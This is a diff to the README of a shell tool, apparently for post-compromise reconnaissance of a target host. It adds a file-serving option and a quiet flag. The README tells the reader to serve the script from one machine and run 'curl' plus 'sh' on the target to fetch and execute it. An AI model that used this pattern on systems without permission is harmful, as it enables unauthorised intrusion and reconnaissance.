@@ -12,8 +12,7 @@ sh internal-recon.sh
 Local network:
 ```sh
 # Host
-python -m SimpleHTTPServer 8000 #or
-python3 -m http.server 8000
+sh internal-recon.sh -w
 # Target
 curl -LJO <Host>:8000/internal-recon.sh
 sh internal-recon.sh
@@ -24,14 +23,15 @@ sh internal-recon.sh
 ```sh
 sh internal-recon.sh -h
 
-Usage: sh internal-recon.sh [-h/-?] [-c]
+Usage: internal-recon.sh [options]
 
--h/-?
-  Show this help message
+Options:
+-h    Show this help message
+-w    Serves an local web server for transferring files
 
--c
-  No colours
-  Without colours, the output can probably be read better
+Output:
+-c    No colours. Without colours, the output can probably be read better
+-q    Quiet. No banner and no advisory displayed
 ```
 
 ## Checks
@@ -49,7 +49,7 @@ Script collecting information about:
 
 ## Results
 
-Results saved to current directory and printed to stdout.
+Results saved to files in current directory and printed to stdout.
 
 ## Compatibility
 
